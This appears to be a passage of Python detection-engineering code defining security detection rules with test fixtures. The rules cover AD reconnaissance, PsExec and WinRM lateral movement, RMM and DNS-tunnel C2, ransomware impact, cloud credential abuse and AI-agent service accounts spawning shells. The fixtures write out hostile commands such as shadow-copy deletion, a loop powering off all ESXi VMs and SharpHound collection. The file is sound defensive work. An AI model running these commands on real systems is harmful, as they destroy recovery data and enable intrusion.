        mitre_attack=["T1087.002", "T1069.002"],
        fixtures=[
            DetectionFixture("positive", {"Image": "SharpHound.exe", "CommandLine": "SharpHound.exe -c All"}, True),
            DetectionFixture("negative", {"Image": "net.exe", "CommandLine": "net use * /delete"}, False),
        ],
    ),
    DetectionRuleContent(
        rule_id="DET-LM-001",
        name="PsExec Lateral Movement Service Creation",
        description="Detects remote execution via PsExec service binary (PSEXESVC.exe).",
        tactic=Tactic.LATERAL_MOVEMENT,
        technique_id="T1021.002",
        technique_name="SMB/Windows Admin Shares",
        platform=Platform.WINDOWS,
        severity=Severity.HIGH,
        confidence="confirmed",
        lane="endpoint",
        predicate=_pred_psexec_lateral_movement,
        telemetry_requirements=["service_creation", "process_creation"],
        mitre_attack=["T1021.002"],
        fixtures=[
            DetectionFixture("positive", {"Image": "PSEXESVC.exe", "CommandLine": "PSEXESVC.exe"}, True),
            DetectionFixture("negative", {"Image": "svchost.exe", "CommandLine": "svchost.exe -k netsvcs"}, False),
        ],
    ),
    DetectionRuleContent(
        rule_id="DET-LM-002",
        name="WinRM Remote PowerShell Execution",
        description="Detects PowerShell processes spawned as children of the Windows Remote Management host (wsmprovhost.exe).",
        tactic=Tactic.LATERAL_MOVEMENT,
        technique_id="T1021.006",
        technique_name="Windows Remote Management",
        platform=Platform.WINDOWS,
        severity=Severity.MEDIUM,
        confidence="high",
        lane="behavior",
        predicate=_pred_winrm_remote_exec,
        telemetry_requirements=["process_creation", "parent_process"],
        mitre_attack=["T1021.006", "T1059.001"],
        fixtures=[
            DetectionFixture("positive", {"ParentImage": "wsmprovhost.exe", "Image": "powershell.exe"}, True),
            DetectionFixture("negative", {"ParentImage": "explorer.exe", "Image": "powershell.exe"}, False),
        ],
    ),

    # Command and Control
    DetectionRuleContent(
        rule_id="DET-CC-001",
        name="Dual-Use RMM Remote Access Tool Execution",
        description="Detects execution of remote monitoring and management (RMM) binaries commonly abused for persistent C2.",
        tactic=Tactic.COMMAND_AND_CONTROL,
        technique_id="T1219",
        technique_name="Remote Access Software",
        platform=Platform.WINDOWS,
        severity=Severity.HIGH,
        confidence="high",
        lane="endpoint",
        predicate=_pred_unauthorized_rmm_execution,
        telemetry_requirements=["process_creation", "command_line"],
        false_positive_notes="Legitimate IT helpdesk software; requires contextual Security State discrimination.",
        mitre_attack=["T1219"],
        fixtures=[
            DetectionFixture("positive", {"Image": "AnyDesk.exe", "CommandLine": "AnyDesk.exe --install"}, True),
            DetectionFixture("negative", {"Image": "slack.exe", "CommandLine": "slack.exe"}, False),
        ],
    ),
    DetectionRuleContent(
        rule_id="DET-CC-002",
        name="DNS Tunneling Query Pattern",
        description="Detects high-entropy, long-subdomain DNS queries characteristic of DNS tunneling data exfiltration.",
        tactic=Tactic.COMMAND_AND_CONTROL,
        technique_id="T1071.004",
        technique_name="DNS",
        platform=Platform.WINDOWS,
        severity=Severity.HIGH,
        confidence="high",
        lane="network",
        predicate=_pred_dns_tunneling,
        telemetry_requirements=["dns_query"],
        mitre_attack=["T1071.004", "T1048"],
        fixtures=[
            DetectionFixture("positive", {"query": "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6.tunnel.c2server.org"}, True),
            DetectionFixture("negative", {"query": "api.github.com"}, False),
        ],
    ),

    # Impact & Ransomware
    DetectionRuleContent(
        rule_id="DET-IM-001",
        name="Volume Shadow Copy Deletion",
        description="Detects deletion of volume shadow copies via vssadmin.exe or wmic.exe, a hallmark of ransomware staging.",
        tactic=Tactic.IMPACT,
        technique_id="T1490",
        technique_name="Inhibit System Recovery",
        platform=Platform.WINDOWS,
        severity=Severity.CRITICAL,
        confidence="confirmed",
        lane="endpoint",
        predicate=_pred_vss_shadow_deletion,
        telemetry_requirements=["process_creation", "command_line"],
        mitre_attack=["T1490"],
        fixtures=[
            DetectionFixture("positive", {"Image": "vssadmin.exe", "CommandLine": "vssadmin.exe delete shadows /all /quiet"}, True),
            DetectionFixture("negative", {"Image": "vssadmin.exe", "CommandLine": "vssadmin.exe list shadows"}, False),
        ],
    ),
    DetectionRuleContent(
        rule_id="DET-IM-003",
        name="VMware ESXi Mass Virtual Machine Destruction",
        description="Detects mass power-off and destruction of virtual machines on VMware ESXi hypervisors via vim-cmd / esxcli.",
        tactic=Tactic.IMPACT,
        technique_id="T1485",
        technique_name="Data Destruction",
        platform=Platform.HYPERVISOR,
        severity=Severity.CRITICAL,
        confidence="confirmed",
        lane="endpoint",
        predicate=_pred_esxi_mass_vm_destruction,
        telemetry_requirements=["hypervisor_command_line", "auditd"],
        mitre_attack=["T1485", "T1565.001"],
        fixtures=[
            DetectionFixture("positive", {"CommandLine": "for i in $(vim-cmd vmsvc/getallvms | awk '{print $1}'); do vim-cmd vmsvc/power.off $i; done"}, True),
            DetectionFixture("negative", {"CommandLine": "vim-cmd vmsvc/getallvms"}, False),
        ],
    ),
    DetectionRuleContent(
        rule_id="DET-IM-004",
        name="High-Velocity Mass Ransomware Encryption",
        description="Detects rapid modification and extension renaming of files matching known ransomware extensions (.locked, .crypted).",
        tactic=Tactic.IMPACT,
        technique_id="T1486",
        technique_name="Data Encrypted for Impact",
        platform=Platform.WINDOWS,
        severity=Severity.CRITICAL,
        confidence="confirmed",
        lane="behavior",
        predicate=_pred_high_velocity_mass_encryption,
        telemetry_requirements=["file_activity", "endpoint"],
        mitre_attack=["T1486"],
        fixtures=[
            DetectionFixture("positive", {"file": {"action": "rename", "extension": ".locked"}, "modifications_per_second": 120}, True),
            DetectionFixture("negative", {"file": {"action": "modify", "extension": ".docx"}, "modifications_per_second": 2}, False),
        ],
    ),

    # Emerging Identities (Non-Human & AI-Agent)
    DetectionRuleContent(
        rule_id="DET-EM-001",
        name="Non-Human Identity Key Abuse",
        description="Detects service principals or workload identities adding credentials to other service principals.",
        tactic=Tactic.PRIVILEGE_ESCALATION,
        technique_id="T1078.004",
        technique_name="Cloud Accounts",
        platform=Platform.CLOUD,
        severity=Severity.CRITICAL,
        confidence="high",
        lane="event",
        predicate=_pred_non_human_spn_abuse,
        telemetry_requirements=["cloud_audit", "entra_id"],
        mitre_attack=["T1078.004", "T1098"],
        fixtures=[
            DetectionFixture("positive", {"principal_kind": "service_principal", "action": "AddPassword"}, True),
            DetectionFixture("negative", {"principal_kind": "service_principal", "action": "GetSecret"}, False),
        ],
    ),
    DetectionRuleContent(
        rule_id="DET-EM-002",
        name="Autonomous AI-Agent Subprocess Shell Execution",
        description="Detects automated AI-agent service identities initiating interactive OS shells or subprocess execution.",
        tactic=Tactic.EXECUTION,
        technique_id="T1059",
        technique_name="Command and Scripting Interpreter",
        platform=Platform.WINDOWS,
        severity=Severity.HIGH,
        confidence="high",
        lane="behavior",
        predicate=_pred_ai_agent_unauthorized_shell,
        telemetry_requirements=["process_creation", "identity"],
        mitre_attack=["T1059"],
        fixtures=[
            DetectionFixture("positive", {"user_id": "ai-agent-service", "Image": "powershell.exe", "CommandLine": "powershell.exe whoami"}, True),
            DetectionFixture("negative", {"user_id": "ai-agent-service", "Image": "python.exe", "CommandLine": "python app.py"}, False),
        ],
    ),
]
